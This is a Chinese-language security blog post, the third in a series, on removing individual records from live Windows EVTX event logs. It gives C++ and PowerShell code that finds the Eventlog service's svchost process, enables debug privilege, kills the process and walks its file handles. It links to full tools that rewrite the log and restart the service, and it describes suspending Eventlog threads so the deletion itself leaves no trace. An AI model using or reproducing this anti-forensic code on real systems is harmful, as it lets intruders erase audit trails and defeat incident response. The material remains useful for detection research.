---
layout: post
title: Windows XML Event Log (EVTX)单条日志清除（三）——通过解除文件占用删除当前系统单条日志记录
---


## 0x00 前言
---

Windows XML Event Log (EVTX)单条日志清除系列文章的第三篇，介绍第一种删除当前系统evtx日志文件单条日志记录的方法：关闭服务对应的进程，释放文件句柄，解除文件占用，删除日志，重启服务

## 0x01 简介
---

本文将要介绍以下内容：

- 通过c程序枚举服务信息，提取Eventlog服务对应进程svchost.exe的pid
- 通过c程序提权关闭Eventlog进程
- 通过c程序释放文件句柄
- 通过c程序删除单条日志文件

## 0x02 删除思路
---

在上篇文章[《Windows XML Event Log (EVTX)单条日志清除（二）——程序实现删除evtx文件的单条日志记录》](https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%8C-%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E5%88%A0%E9%99%A4evtx%E6%96%87%E4%BB%B6%E7%9A%84%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/)介绍了删除单条日志记录的方法，但如果直接用来删除当前系统的日志，在打开文件时会报错，提示文件被占用

这是因为当前系统启动日志服务Eventlog后，会以独占模式打开日志文件，导致其他进程无法打开该日志文件，也就无法进行修改操作

有以下两种解决方法：

1. 结束日志服务Eventlog对应的进程，释放文件句柄，获得修改日志文件的权限

2. 获得日志服务Eventlog对应进程中指定日志文件的句柄，利用该句柄实现日志文件的修改


本文将要介绍第一种解决方法，分享在程序实现上的细节，最后开源实现代码

第二种解决方法会在之后的文章进行详细介绍


## 0x03 获得Eventlog服务对应进程svchost.exe的pid
---

由于Windows系统有多个svchost.exe进程，无法直接搜索进程名"svchost.exe"获得Eventlog服务对应的进程pid

查询思路：

枚举当前系统服务，根据服务名称筛选出对应的进程pid

### 1、通过powershell实现

代码如下：

```
Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId
```

### 2、通过c++实现

```
#include <windows.h>
#pragma comment(lib,"Advapi32.lib") 
DWORD  getpid()
{
	DWORD PID = 0;
	SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (scHandle == NULL)
	{
		printf("[!]OpenSCManager fail(%ld)", GetLastError());
	}
	else
	{
		SC_ENUM_TYPE infoLevel = SC_ENUM_PROCESS_INFO;
		DWORD dwServiceType = SERVICE_WIN32;
		DWORD dwServiceState = SERVICE_STATE_ALL;
		LPBYTE lpServices = NULL;
		DWORD cbBufSize = 0;
		DWORD pcbBytesNeeded;
		DWORD servicesReturned;
		LPDWORD lpResumeHandle = NULL;
		LPCSTR pszGroupName = NULL;
		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
		cbBufSize = pcbBytesNeeded;
		lpServices = new BYTE[cbBufSize];
		if (NULL == lpServices)
		{
			printf("[!]lpServices = new BYTE[%ld] -> fail(%ld)\n", cbBufSize, GetLastError());
		}
		else
		{
			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
			for (DWORD i = 0; i < servicesReturned; i++)
			{
				_strlwr_s(lpServiceStatusProcess[i].lpServiceName, strlen(lpServiceStatusProcess[i].lpServiceName) + 1);
				if (strstr(lpServiceStatusProcess[i].lpServiceName, "eventlog") != 0)
				{
					printf("[+]ServiceName:%s\n", lpServiceStatusProcess[i].lpServiceName);
					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
				}
			}
			delete[] lpServices;
		}
		CloseServiceHandle(scHandle);
	}
	if (PID == 0)
		printf("[!]Get EventLog's PID error\n");

	return PID;
}

int main(int argc, char *argv[])
{
	DWORD pid = getpid();
	return 0;
}
```

## 0x04 提权关闭Eventlog进程
---

### 1、通过powershell实现

执行cmd命令taskkill即可

### 2、通过c++实现

c++的代码需要提升权限才能结束进程svchost.exe

```
#include <windows.h>

#pragma comment(lib,"Advapi32.lib") 

BOOL EnableDebugPrivilege(BOOL fEnable)
{
	BOOL fOk = FALSE;
	HANDLE hToken;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		TOKEN_PRIVILEGES tp;
		tp.PrivilegeCount = 1;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
		tp.Privileges[0].Attributes = fEnable ? SE_PRIVILEGE_ENABLED : 0;
		AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
		fOk = (GetLastError() == ERROR_SUCCESS);
		CloseHandle(hToken);
	}
	return(fOk);
}

DWORD  getpid()
{
	DWORD PID = 0;
	SC_HANDLE scHandle = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
	if (scHandle == NULL)
	{
		printf("[!]OpenSCManager fail(%ld)", GetLastError());
	}
	else
	{
		SC_ENUM_TYPE infoLevel = SC_ENUM_PROCESS_INFO;
		DWORD dwServiceType = SERVICE_WIN32;
		DWORD dwServiceState = SERVICE_STATE_ALL;
		LPBYTE lpServices = NULL;
		DWORD cbBufSize = 0;
		DWORD pcbBytesNeeded;
		DWORD servicesReturned;
		LPDWORD lpResumeHandle = NULL;
		LPCSTR pszGroupName = NULL;
		BOOL ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
		cbBufSize = pcbBytesNeeded;
		lpServices = new BYTE[cbBufSize];
		if (NULL == lpServices)
		{
			printf("[!]lpServices = new BYTE[%ld] -> fail(%ld)\n", cbBufSize, GetLastError());
		}
		else
		{
			ret = EnumServicesStatusEx(scHandle, infoLevel, dwServiceType, dwServiceState, lpServices, cbBufSize, &pcbBytesNeeded, &servicesReturned, lpResumeHandle, pszGroupName);
			LPENUM_SERVICE_STATUS_PROCESS lpServiceStatusProcess = (LPENUM_SERVICE_STATUS_PROCESS)lpServices;
			for (DWORD i = 0; i < servicesReturned; i++)
			{
				_strlwr_s(lpServiceStatusProcess[i].lpServiceName, strlen(lpServiceStatusProcess[i].lpServiceName) + 1);
				if (strstr(lpServiceStatusProcess[i].lpServiceName, "eventlog") != 0)
				{
					printf("[+]ServiceName:%s\n", lpServiceStatusProcess[i].lpServiceName);
					printf("[+]PID:%ld\n", lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId);
					PID = lpServiceStatusProcess[i].ServiceStatusProcess.dwProcessId;
				}
			}
			delete[] lpServices;
		}
		CloseServiceHandle(scHandle);
	}

	return PID;
}

int main(int argc, char *argv[])
{

	DWORD pid = getpid();
	if (pid == 0)
	{
		printf("[!]Get EventLog's PID error\n");
		return -1;
	}

	printf("[+]Try to EnableDebugPrivilege... ");
	if (!EnableDebugPrivilege(TRUE))
	{
		printf("[!]AdjustTokenPrivileges Failed.<%d>\n", GetLastError());
		return -1;
	}
	printf("Done\n");

	printf("[+]Try to OpenProcess... ");
	HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
	if (processHandle == NULL)
	{
		printf("Error\n");
		return -1;
	}
	printf("Done\n");

	printf("[+]Try to TerminateProcess... ");
	BOOL bResult = TerminateProcess(processHandle, 0);
	if (bResult == NULL)
	{
		printf("[!]Error\n");
		return -1;
	}
	printf("Done\n");

	return 0;
}
```

**注：**

结束Eventlog服务对应的进程后，隔一段时间后Eventlog服务会自动重启

## 0x05 释放文件句柄
---

结束Eventlog服务对应的进程后，还需要释放日志文件的句柄，才能够获得文件的修改权限

**实现思路：**

1.利用NtQuerySystemInformation查询SystemHandleInformation获得所有进程的句柄信息
2.挑选出日志进程中的所有句柄
3.释放句柄

关键代码如下：

```
BOOL CloseFileHandle(LPWSTR buf1, DWORD pid)
{
	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;
	HANDLE processHandle = NULL;
	ULONG i;
	DWORD ErrorPID = 0;
	SYSTEM_HANDLE handle = { 0 };

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQuerySystemInformation");
	if (!NtQuerySystemInformation)
	{
		printf("[!]Could not find NtQuerySystemInformation entry point in NTDLL.DLL");
		return 0;
	}
	_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtDuplicateObject");
	if (!NtDuplicateObject)
	{
		printf("[!]Could not find NtDuplicateObject entry point in NTDLL.DLL");
		return 0;
	}
	_NtQueryObject NtQueryObject = (_NtQueryObject)GetProcAddress(GetModuleHandleA("NtDll.dll"), "NtQueryObject");
	if (!NtQueryObject)
	{
		printf("[!]Could not find NtQueryObject entry point in NTDLL.DLL");
		return 0;
	}

	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
	while ((status = NtQuerySystemInformation(SystemHandleInformation, handleInfo, handleInfoSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (!NT_SUCCESS(status))
	{
		printf("[!]NtQuerySystemInformation failed!\n");
		return 0;
	}

	UNICODE_STRING objectName;
	ULONG returnLength;
	for (i = 0; i < handleInfo->HandleCount; i++)
	{
		handle = handleInfo->Handles[i];
		HANDLE dupHandle = NULL;
		POBJECT_TYPE_INFORMATION objectTypeInfo = NULL;
		PVOID objectNameInfo = NULL;

		if (handle.ProcessId != pid)
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			continue;
		}

		if (handle.ProcessId == ErrorPID)
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			continue;
		}

		if (!(processHandle = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handle.ProcessId)))
		{
			printf("[!]Could not open PID %d!\n", handle.ProcessId);
			ErrorPID = handle.ProcessId;
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}

		if (!NT_SUCCESS(NtDuplicateObject(processHandle, (HANDLE)handle.Handle, GetCurrentProcess(), &dupHandle, 0, 0, 0)))
		{
			//			printf("[%#x] Error!\n", handle.Handle);
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}
		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(dupHandle, ObjectTypeInformation, objectTypeInfo, 0x1000, NULL)))
		{
			//			printf("[%#x] Error!\n", handle.Handle);
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}
		objectNameInfo = malloc(0x1000);

		if (IsBlockingHandle(dupHandle) == TRUE) //filter out the object which NtQueryObject could hang on
		{
			free(objectTypeInfo);
			free(objectNameInfo);
			CloseHandle(dupHandle);
			CloseHandle(processHandle);
			continue;
		}
		CloseHandle(dupHandle);
	}
	free(handleInfo);

	return TRUE;
}
```



## 0x06 修改日志文件，删除日志记录
---

结束Eventlog服务对应的进程后，获得了操作日志文件的权限，修改日志文件的方法和c代码可参考上一篇文章[《Windows XML Event Log (EVTX)单条日志清除（二）——程序实现删除evtx文件的单条日志记录》](https://3gstudent.github.io/3gstudent.github.io/Windows-XML-Event-Log-(EVTX)%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4-%E4%BA%8C-%E7%A8%8B%E5%BA%8F%E5%AE%9E%E7%8E%B0%E5%88%A0%E9%99%A4evtx%E6%96%87%E4%BB%B6%E7%9A%84%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95/)

代码参考地址：

`https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/DeleteRecordbyTerminateProcess.cpp`

代码实现了自动获得日志服务的进程，结束进程，释放句柄，修改指定的系统日志文件内容，修改成功后重新启动日志服务

程序测试如图：

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-7-5/1-1.png)

### 更新(2018.7.29)

在github上看到了另外一种实现思路，地址如下：

https://github.com/360-A-Team/EventCleaner/blob/master/EventCleaner/

值得注意的是日志删除使用了WinAPI EvtExportLog
 
利用EvtExportLog对日志文件进行过滤，过滤条件为去除某一条日志，这样新生成的文件就是删除单条日志后的文件

优点是不用考虑日志删除的细节，文件格式不会出错，方便高效，并且修改过滤条件可以很容易删除一段时间内的日志

但是存在一点不足：

对于删除日志的后续日志，没有更新EventRecordID

举个简单例子：

Security.evtx下面有10条日志，EventRecordID为1-10，通过EvtExportLog删除第8条日志，第9和第10条日志的EventRecordID不变，仍然为9和10，但是删除后的日志总数为9，EventRecordID依次为1-7，9，10

我的[代码](https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/DeleteRecordbyTerminateProcess.cpp)中采用的方法虽然能解决这个问题，但是需要考虑很多细节和意外情况，程序实现上比较复杂

所以，我在我的工程中也加入了利用EvtExportLog删除日志的方法，地址如下：

`https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/DeleteRecordbyTerminateProcessEx.cpp`

代码实现了自动获得日志服务的进程，结束进程，释放句柄，利用EvtExportLog修改指定的系统日志文件内容，修改成功后重新启动日志服务

程序测试如图：

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-7-5/1-2.png)

## 0x07 其他细节
---

某些情况下，关闭Eventlog进程和重启服务Eventlog会产生日志文件，位于system.evtx下，EventID为`7034`和`7036`

为了避免产生日志7034和7036，可通过关闭日志服务Eventlog线程的方法关闭日志记录功能

关闭日志服务Eventlog线程的powershell实现代码：

https://github.com/hlldz/Invoke-Phant0m


关闭日志服务Eventlog线程的c实现代码：

https://github.com/3gstudent/Windwos-EventLog-Bypass

介绍细节的分析文章：

[《利用API NtQueryInformationThread和I_QueryTagInformation实现对Windwos日志监控的绕过》](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8API-NtQueryInformationThread%E5%92%8CI_QueryTagInformation%E5%AE%9E%E7%8E%B0%E5%AF%B9Windwos%E6%97%A5%E5%BF%97%E7%9B%91%E6%8E%A7%E7%9A%84%E7%BB%95%E8%BF%87/)

在实际应用中，通常是先线程挂起，最后再恢复线程

参考地址：

`https://github.com/3gstudent/Eventlogedit-evtx--Evolution/blob/master/SuspendorResumeTid.cpp`

代码支持挂起、恢复和结束日志服务的线程，可用来关闭和恢复日志记录功能


## 0x07 小结
---

本文介绍了通过关闭服务对应的进程，释放文件句柄，解除文件占用，删除当前系统单条日志记录的方法。

优化关闭日志记录功能的代码，添加挂起和恢复的代码，支持关闭和重新开启系统的日志功能


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)





